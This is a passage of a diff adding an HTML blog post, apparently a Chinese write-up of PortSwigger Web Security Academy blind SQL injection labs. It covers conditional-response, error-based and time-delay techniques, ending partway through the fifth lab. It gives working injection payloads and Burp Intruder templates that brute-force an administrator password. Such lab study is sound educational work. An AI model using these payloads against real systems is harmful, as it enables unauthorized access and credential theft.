@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 SQL Injection（SQL 注入漏洞）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy SQL 注入（二）">
+<meta property="og:url" content="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 SQL Injection（SQL 注入漏洞）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection.png">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection-2.png">
+<meta property="article:published_time" content="2025-03-08T03:33:04.626Z">
+<meta property="article:modified_time" content="2025-03-08T03:31:53.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="Burp Intruder">
+<meta property="article:tag" content="Burp Collaborator">
+<meta property="article:tag" content="Blind Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection.png">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/","path":"2025/03/08/burp-web-academy-sql-injection-part2/","title":"Burp Web Academy SQL 注入（二）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy SQL 注入（二） | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL-Injection"><span class="nav-number">2.</span> <span class="nav-text">0x02. SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Blind-SQL-injection-with-conditional-responses"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Blind SQL injection with conditional responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Blind-SQL-injection-with-conditional-errors"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Blind SQL injection with conditional errors</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Visible-error-based-SQL-injection"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Visible error-based SQL injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Blind-SQL-injection-with-time-delays"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Blind SQL injection with time delays</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Blind SQL injection with time delays and information retrieval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Blind SQL injection with out-of-band interaction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: Blind SQL injection with out-of-band data exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 Lab: SQL injection with filter bypass via XML encoding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy SQL 注入（二） | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy SQL 注入（二）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-08 11:33:04 / 修改时间：11:31:53" itemprop="dateCreated datePublished" datetime="2025-03-08T11:33:04+08:00">2025-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 SQL Injection（SQL 注入漏洞）。</p>
+<span id="more"></span>
+
+<ul>
+<li><a href="https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/">Burp Web Academy SQL 注入</a></li>
+<li><a href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">Burp Web Academy SQL 注入（二）</a></li>
+</ul>
+<h2 id="0x02-SQL-Injection"><a href="#0x02-SQL-Injection" class="headerlink" title="0x02. SQL Injection"></a>0x02. SQL Injection</h2><h3 id="2-1-Lab-Blind-SQL-injection-with-conditional-responses"><a href="#2-1-Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="2.1 Lab: Blind SQL injection with conditional responses"></a>2.1 Lab: Blind SQL injection with conditional responses</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a <code>Welcome back</code> message in the page if the query returns any rows.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+<p><em>You can assume that the password only contains lowercase, alphanumeric characters.</em></p>
+</blockquote>
+<p>Blind SQL Injection 即<strong>盲注</strong>，指没有信息回显的场景下的 SQL 注入。</p>
+<p>Cookie 如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>TrackingId=T6KH6I5if70PRMUs; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=r7vmrP73h1PwVnvBdtc0cZqfQagyyJLi; Secure; HttpOnly; SameSite=None</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11402</span><br></pre></td></tr></table></figure>
+
+<p>携带正常的 <code>TrackingId</code> Cookie 访问，会提示 <code>Welcome back!</code>，一种简单的盲注测试方法：</p>
+<ul>
+<li>发送 <code>TrackingId=T6KH6I5if70PRMUs&#39; and 1=2--</code>，没有 <code>Welcome back!</code></li>
+<li>发送 <code>TrackingId=T6KH6I5if70PRMUs&#39; and 1=1--</code>，返回 <code>Welcome back!</code></li>
+</ul>
+<p>说明 SQL 注入是存在的！后续测试 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select null--</span><br><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select &#x27;test&#x27;--</span><br><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select concat(username,&#x27;|&#x27;,password) from users--</span><br></pre></td></tr></table></figure>
+
+<p>很遗憾，这个方法并不能把查询到的数据返回给攻击者。需要再次利用盲注来爆破 <code>administrator</code> 用户的密码，根据提示，密码字符只包含小写字母和数字。我们已经有了一些已知信息，只需要基于 <code>select password from users where username=&#39;administrator&#39;</code> 做一些额外的判断：</p>
+<ul>
+<li>密码的长度是多少？</li>
+<li>密码中每个字符又是什么？</li>
+</ul>
+<p>首先，我们判断密码字符串的长度，在 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> 中使用如下模板进行爆破，可以判断出密码长度为 <code>20</code>。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a510088044b92e48542530d00610044.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=X&#x27; OR (select &#x27;a&#x27; from users where username=&#x27;administrator&#x27; and length(password)=§1§)=&#x27;a&#x27;--; session=hepiAR5rSEd4nFgU6SxuKgYzgClLRi2E</span><br></pre></td></tr></table></figure>
+
+<p>随后，我们要依次判断密码字符串中每个字符的值（使用 Cluster bomb 模式）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a510088044b92e48542530d00610044.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=X&#x27; OR (select &#x27;a&#x27; from users where username=&#x27;administrator&#x27; and substring(password,§1§,1)=&#x27;§0§&#x27;)=&#x27;a&#x27;--; session=hepiAR5rSEd4nFgU6SxuKgYzgClLRi2E</span><br></pre></td></tr></table></figure>
+
+<p>请求发送次数为 <code>length(password) * (26 + 10) = 20 * 36 = 720</code>。爆破完成后，对结果进行筛选后排序，即可恢复出密码的内容：</p>
+<p><img src="/images/burp-intruder-blind-sql-injection.png" alt="Burp Intruder Blind SQL Injection"></p>
+<h3 id="2-2-Lab-Blind-SQL-injection-with-conditional-errors"><a href="#2-2-Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="2.2 Lab: Blind SQL injection with conditional errors"></a>2.2 Lab: Blind SQL injection with conditional errors</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>漏洞跟前应该是一样的，只不过没有任何回显了，只能靠错误信息来推测。这里如果 SQL 执行出错，会返回 <code>HTTP/2 500 Internal Server Error</code>。</p>
+<p>题目提示这是一个 Oracle 数据库，Oracle SQL 支持使用 <code>||</code> 来连接字符串。此外，在 Oracle 中，有一个 <code>dual</code> 表用于测试：</p>
+<blockquote>
+<p><code>DUAL</code> 表本身只有一行，并且这行数据通常包含一个伪列（虚拟列），其名称为 <code>DUMMY</code>，且其值通常为 <code>&#39;X&#39;</code>。这意味着 <code>DUAL</code> 表实际上并不包含任何实际业务数据，而是用于执行各种SQL操作时的占位符。</p>
+</blockquote>
+<p>判断 SQL 注入：</p>
+<ul>
+<li><code>TrackingId=&#39;</code> 返回 <code>500</code></li>
+<li><code>TrackingId=&#39; AND 1=1--</code> 返回 <code>200</code></li>
+</ul>
+<p>还是参考 SQL Injection Cheat Sheet，测试如下语句，返回 <code>500</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT CASE WHEN (length(username)=13) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>而如果把长度改成 <code>13</code> 以外的其他值，则返回 <code>200</code>，说明 Payload 模板是 OK 的。这里的关键点是利用<strong>除零错误</strong>来抛出异常。</p>
+<p>接下来，先使用 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> 来爆破密码字段的长度：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT CASE WHEN (length(password)=§0§) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--; session=onKvT4PGNADwgSnNH9ExSZIiS9zQEtuj</span><br></pre></td></tr></table></figure>
+
+<p>得出长度是 <code>20</code>，然后使用 Cluster bomb 模式来爆破密码（注意 Oracle 中使用 <code>substr</code> 而不是 <code>substring</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT CASE WHEN (substr(password,§0§,1)=&#x27;§0§&#x27;) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>爆破结果：</p>
+<p><img src="/images/burp-intruder-blind-sql-injection-2.png" alt="Burp Intruder Blind SQL Injection"></p>
+<p>官方解法没有使用 <code>union</code>，而是使用 <code>||</code> 来拼接字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=xyz&#x27;||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-Visible-error-based-SQL-injection"><a href="#2-3-Lab-Visible-error-based-SQL-injection" class="headerlink" title="2.3 Lab: Visible error-based SQL injection"></a>2.3 Lab: Visible error-based SQL injection</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. To solve the lab, find a way to leak the password for the <code>administrator</code> user, then log in to their account.</p>
+</blockquote>
+<p>测试如下数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=N0uh37abFCkNE6EZ&#x27;; session=V0QMalc9YRkLZzqq8aZiEKM0FiL2SL9o</span><br></pre></td></tr></table></figure>
+
+<p>HTML 页面提示错误信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = &#x27;N0uh37abFCkNE6EZ&#x27;&#x27;. Expected  char</span><br></pre></td></tr></table></figure>
+
+<p>这个题目是利用 <code>cast</code> 抛出异常来泄露信息，同时 SQL 查询字符串还有长度限制，所以解法有点取巧。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a84005803fd90048144cb7e000e00b8.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27;%3bselect cast(username as int) from users limit 1--; session=szltq7Fk49jedcl3hp0Lg6IPGy3rtTN3</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>这里用了 <code>;</code> 即 <code>%3B</code> 来分隔 SQL 语句，通过 <code>limit 1</code> 来泄露第一条数据，实际上就是 <code>administrator</code>。</p>
+<p>而如果不考虑长度，可以测试 <code>union</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select cast(password as int) from users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>但实际上会提示（SQL 语句已经截断）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = &#x27;&#x27; union select cast(password as int) from users where userna&#x27;. Expected  char</span><br></pre></td></tr></table></figure>
+
+<p>官方解法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND cast((select password from users limit 1) as int)=1--</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-Lab-Blind-SQL-injection-with-time-delays"><a href="#2-4-Lab-Blind-SQL-injection-with-time-delays" class="headerlink" title="2.4 Lab: Blind SQL injection with time delays"></a>2.4 Lab: Blind SQL injection with time delays</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p>
+<p>To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.</p>
+</blockquote>
+<p>没有任何错误提示，只能慢慢测试，通过 <code>sleep</code> 来判断是否存在 SQL 注入漏洞。</p>
+<p>实际上这是一个 PostgreSQL 数据库，使用 <code>pg_sleep(10)</code> 可以实现延时，关键是怎么和 <code>select</code> 进行拼接。由于 <code>pg_sleep</code> 返回 <code>void</code>，所以：</p>
+<ul>
+<li>无法通过 <code>union</code> 来拼接（要求列数、类型一致）</li>
+<li>无法通过 <code>AND</code> 等拼接（要求 <code>BOOL</code>）</li>
+<li>因为在 Cookie 中，所以也无法使用 <code>;</code></li>
+</ul>
+<p>可行的方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=X&#x27; || pg_sleep(10)--; session=yMtu8nt3WDEDhimQZN3Cq6hbBTmZMmKe</span><br></pre></td></tr></table></figure>
+
+<p>在 PostgreSQL 中，<code>||</code> 用于拼接字符串，而 <code>void</code> 可以和字符串拼接，尽管不产生任何作用。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span><span class="operator">||</span>pg_sleep(<span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;b&#x27;</span> <span class="comment">-- ab</span></span><br></pre></td></tr></table></figure>
+
+<p>此外，如下方法也可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=X&#x27; OR pg_sleep(10) is null--; session=yMtu8nt3WDEDhimQZN3Cq6hbBTmZMmKe</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="2.5 Lab: Blind SQL injection with time delays and information retrieval"></a>2.5 Lab: Blind SQL injection with time delays and information retrieval</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>首先，通过如下语句，可以确认数据库类型为 PostgreSQL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=mFKKwlWqebWsnHxd&#x27;||pg_sleep(10)--;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，需要一步一步测试出爆破的模板：</p>
+<p>1）首先，我们的目标是需要先测试 <code>password</code> 字段的长度，看起来应该这么写 SQL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(password)=20) then pg_sleep(10) else pg_sleep(0) end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>2）我们可以先使用 <code>username</code> 来测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(username)=13) then pg_sleep(10) else pg_sleep(0) end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
